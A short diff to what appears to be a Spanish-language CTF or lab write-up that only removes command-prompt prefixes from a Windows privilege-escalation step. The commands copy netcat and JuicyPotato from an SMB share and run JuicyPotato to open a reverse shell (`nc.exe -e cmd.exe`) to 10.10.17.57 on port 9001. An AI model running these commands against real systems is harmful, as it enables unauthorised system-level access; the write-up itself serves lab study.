@@ -523,17 +523,17 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 ```
 
 ```powershell
-C:\Windows\Temp\privesc>copy \\10.10.17.57\smbFolder\nc64.exe .\nc.exe
+copy \\10.10.17.57\smbFolder\nc64.exe .\nc.exe
         1 file(s) copied.
 
-C:\Windows\Temp\privesc>copy \\10.10.17.57\smbFolder\JuicyPotato.exe .\jp.exe
+copy \\10.10.17.57\smbFolder\JuicyPotato.exe .\jp.exe
         1 file(s) copied.
 ```
 
 Me pongo en escucha con `nc` por el puerto 9001 y ejecuto `jp.exe`.
 
 ```powershell
-C:\Windows\Temp\privesc>.\jp.exe -l 1337 -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\privesc\nc.exe -e cmd.exe 10.10.17.57 9001"
+.\jp.exe -l 1337 -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\privesc\nc.exe -e cmd.exe 10.10.17.57 9001"
 
 Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 ......
